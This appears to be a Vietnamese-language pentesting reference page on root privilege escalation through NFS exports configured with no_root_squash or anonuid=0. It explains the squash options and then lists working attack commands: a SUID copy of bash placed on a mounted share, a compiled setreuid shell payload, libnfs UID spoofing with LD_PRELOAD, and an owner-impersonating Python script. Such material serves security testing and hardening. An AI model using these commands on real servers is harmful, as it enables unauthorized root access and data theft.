# Leo thang đặc quyền do cấu hình sai NFS No Root Squash

{{#include ../../banners/hacktricks-training.md}}

## Thông tin cơ bản về Squashing

Với NFS AUTH_SYS/AUTH_UNIX, máy chủ dựa vào `uid` và `gid` được cung cấp trong mỗi yêu cầu RPC để kiểm tra quyền truy cập tệp. Các security flavor khác, chẳng hạn như Kerberos, dùng thông tin xác thực khác, và máy chủ có thể ánh xạ thông tin xác thực dạng số trước khi kiểm tra quyền.<sup>[[4]](#references)[[5]](#references)</sup>

- **`all_squash`**: Ánh xạ mọi UID và GID sang tài khoản anonymous, mặc định là `nobody` (65534) trên Linux. `no_all_squash` là mặc định đối với các yêu cầu không phải root.<sup>[[4]](#references)</sup>
- **`root_squash`**: Đây là mặc định trên Linux và ánh xạ các yêu cầu có UID/GID 0 (root) sang tài khoản anonymous; các UID và GID khác không bị squash.<sup>[[4]](#references)</sup>
- **`no_root_squash`**: Tắt root squashing, vì vậy các yêu cầu có UID/GID 0 có thể được đánh giá là root trên máy chủ.<sup>[[4]](#references)</sup>

Nếu một client được phép mount một export có quyền ghi trong **`/etc/exports`** được cấu hình với **`no_root_squash`**, các yêu cầu UID/GID 0 của client đó có thể ghi vào export với tư cách root của máy chủ.<sup>[[4]](#references)</sup>

`root_squash` chỉ ánh xạ lại UID/GID 0; với AUTH_SYS, **UID/GID dạng số khác 0** của một client được phép vẫn có thể khớp với một tài khoản khác trên máy chủ. Vì vậy, ngay cả khi bật root squashing, một export có quyền ghi vẫn có thể trở thành đường dẫn truy cập chéo người dùng nếu client có thể tạo tệp bằng danh tính dạng số đó và máy chủ cho phép truy cập. Đối với SUID/SGID handoff, cũng cần xác minh chủ sở hữu tệp sau khi tạo, quyền thực thi, trạng thái `nosuid` của mount trên máy chủ, ACL và SELinux hoặc các chính sách khác. Chỉ riêng đường dẫn được export, tùy chọn `rw` hoặc số UID/GID trùng khớp không chứng minh rằng client được phép truy cập, export đang hoạt động hay hai máy chủ có cùng ánh xạ danh tính hiệu lực. Hãy kiểm tra thụ động `/etc/exports` và metadata cục bộ; không mount share mới hoặc tạo tệp thử nghiệm trong quá trình rà soát.<sup>[[4]](#references)[[5]](#references)</sup>

Để biết thêm thông tin về **NFS**, hãy xem:

{{#ref}}
../../network-services-pentesting/nfs-service-pentesting.md
{{#endref}}

## Leo thang đặc quyền

### Ánh xạ anonymous tương đương root

Đừng chỉ kiểm tra `no_root_squash`. Với `root_squash,anonuid=0,anongid=0`, yêu cầu UID/GID 0 của client bị squash **trở lại thành root**. Với `all_squash,anonuid=0,anongid=0`, ngay cả danh tính không phải root của client cũng được ánh xạ thành root trên máy chủ. Trên một export `sec=sys` có quyền ghi, một trong hai cấu hình này có thể cung cấp primitive tạo tệp thuộc sở hữu root được dùng trong SUID handoff bên dưới; các giới hạn về client được phép và victim mount vẫn áp dụng.<sup>[[4]](#references)</sup>

Trên máy chủ, dùng `exportfs -v` để kiểm tra export đang hoạt động và các tùy chọn áp dụng cho **client tương ứng**, bao gồm `rw`, `sec=`, chế độ squash và `anonuid`/`anongid`. Khi rà soát cấu hình, hãy kiểm tra cả `/etc/exports.d/*.exports`; chỉ xem `/etc/exports` có thể chưa đầy đủ.<sup>[[4]](#references)[[6]](#references)</sup>

```bash
# Example /etc/exports entries: squashed requests map to server UID 0
/srv/share 192.0.2.10(rw,sec=sys,root_squash,anonuid=0,anongid=0)
/srv/share 192.0.2.11(rw,sec=sys,all_squash,anonuid=0,anongid=0)
```

### Remote Exploit

Tùy chọn 1 dùng bash:
- Trên một máy khách được phép, mount một export có quyền ghi dưới quyền root, sao chép **`/bin/bash`** vào đó, đặt bit **SUID**, rồi thực thi tệp này từ một mount trên máy nạn nhân không dùng `nosuid`.<sup>[[2]](#references)[[4]](#references)</sup>
    - Để tệp đã tải lên vẫn thuộc sở hữu của root, máy chủ phải giữ nguyên UID 0 của máy khách bằng **`no_root_squash`** hoặc ánh xạ yêu cầu thành UID 0 bằng **`anonuid=0`**. Nếu không, chỉ có thể tạo binary SUID cho một tài khoản khác khi máy khách có thể tạo hoặc sở hữu tệp đó bằng UID/GID dạng số của tài khoản ấy.<sup>[[4]](#references)</sup>

```bash
#Attacker, as root user
mkdir /tmp/pe
mount -t nfs <IP>:<SHARED_FOLDER> /tmp/pe
cd /tmp/pe
cp /bin/bash .
chmod +s bash

#Victim
cd <SHAREDD_FOLDER>
./bash -p #ROOT shell
```

Tùy chọn 2 sử dụng mã C đã biên dịch:
- Mount thư mục từ một client được phép, sao chép vào đó một payload đã biên dịch khai thác quyền SUID, đặt bit **SUID** cho nó rồi thực thi từ máy nạn nhân (xem một số [payload C SUID](../processes-crontab-systemd-dbus/payloads-to-execute.md#c)).
    - Các hạn chế vẫn như trước

```bash
#Attacker, as root user
gcc payload.c -o payload
mkdir /tmp/pe
mount -t nfs <IP>:<SHARED_FOLDER> /tmp/pe
cd /tmp/pe
cp /tmp/payload .
chmod +s payload

#Victim
cd <SHAREDD_FOLDER>
./payload #ROOT shell
```

### Local Exploit

> [!TIP]
> Lưu ý rằng nếu bạn có thể tạo **tunnel từ máy của mình đến máy nạn nhân, bạn vẫn có thể dùng phiên bản Remote để khai thác lỗi privilege escalation bằng cách tunnel các port cần thiết**.\
> Mẹo sau hữu ích khi `/etc/exports` giới hạn export theo IP của nạn nhân: client từ xa không thể mount nó, nhưng kỹ thuật cục bộ có thể hoạt động thông qua share đã được mount trên host được phép.<sup>[[2]](#references)</sup>\
> Với phương pháp libnfs không cần đặc quyền này, export trong **`/etc/exports`** phải dùng flag `insecure` để process có thể sử dụng source port không dành riêng; `secure` là mặc định, nhưng process có thể bind một reserved port thì không cần tùy chọn này.<sup>[[1]](#references)[[4]](#references)</sup>

### Thông tin cơ bản

Client NFSv3 AUTH_UNIX gửi effective UID, GID và các group của nó trong mỗi lần gọi, còn server dùng các thông tin này để kiểm tra quyền. Kỹ thuật cục bộ này khai thác cơ chế đó bằng cách giả mạo RPC credentials thông qua [libnfs](https://github.com/sahlberg/libnfs); preload module của thư viện hỗ trợ ghi đè UID/GID trong NFS context.<sup>[[1]](#references)[[2]](#references)[[3]](#references)[[5]](#references)</sup>

#### Biên dịch thư viện

Ví dụ libnfs có thể cần điều chỉnh cho kernel mục tiêu; hướng dẫn ở đây lưu ý cụ thể rằng cần comment các syscall fallocate trước khi biên dịch preload module.<sup>[[1]](#references)[[2]](#references)</sup>

```bash
./bootstrap
./configure
make
gcc -fPIC -shared -o ld_nfs.so examples/ld_nfs.c -ldl -lnfs -I./include/ -L./lib/.libs/
```

#### Tiến hành khai thác

Ví dụ này tạo một chương trình trợ giúp C nhỏ để khởi chạy shell, sau đó đặt nó lên share và dùng `ld_nfs.so` với UID 0 trong ngữ cảnh NFS để biến nó thành SUID-root.<sup>[[1]](#references)[[2]](#references)</sup>

1. **Biên dịch mã khai thác:**

```bash
cat pwn.c
int main(void){setreuid(0,0); system("/bin/bash"); return 0;}
gcc pwn.c -o a.out
```

2. **Đặt exploit trên share và thay đổi quyền của nó bằng cách giả mạo UID**.<sup>[[1]](#references)[[2]](#references)</sup>

```bash
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so cp ../a.out nfs://nfs-server/nfs_root/
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chown root: nfs://nfs-server/nfs_root/a.out
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod o+rx nfs://nfs-server/nfs_root/a.out
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod u+s nfs://nfs-server/nfs_root/a.out
```

3. **Thực thi exploit để giành quyền root**.<sup>[[2]](#references)</sup>

```bash
/mnt/share/a.out
#root
```

### Bonus: NFShell để truy cập tệp một cách kín đáo

Sau khi có quyền root, mẫu `nfsh.py` này đặt effective UID thành UID của tệp mục tiêu trước khi chạy lệnh, cho phép truy cập mà không cần thay đổi quyền sở hữu một cách đệ quy.<sup>[[2]](#references)</sup>

```python
#!/usr/bin/env python
# script from https://www.errno.fr/nfs_privesc.html
import sys
import os

def get_file_uid(filepath):
    try:
        uid = os.stat(filepath).st_uid
    except OSError as e:
        return get_file_uid(os.path.dirname(filepath))
    return uid

filepath = sys.argv[-1]
uid = get_file_uid(filepath)
os.setreuid(uid, uid)
os.system(' '.join(sys.argv[1:]))
```

Chạy như sau:

```bash
# ll ./mount/
drwxr-x---  6 1008 1009 1024 Apr  5  2017 9.3_old
```



## References

- [1] [lnv42/libnfs](https://github.com/lnv42/libnfs)
- [2] [Câu chuyện về một kỹ thuật nâng quyền NFS ít được biết đến](https://www.errno.fr/nfs_privesc.html)
- [3] [sahlberg/libnfs](https://github.com/sahlberg/libnfs)
- [4] [exports(5) — trang hướng dẫn sử dụng Linux](https://man7.org/linux/man-pages/man5/exports.5.html)
- [5] [RFC 1813: Đặc tả giao thức NFS phiên bản 3](https://datatracker.ietf.org/doc/html/rfc1813)
- [6] [exportfs(8) — trang hướng dẫn sử dụng Linux](https://man7.org/linux/man-pages/man8/exportfs.8.html)
{{#include ../../banners/hacktricks-training.md}}
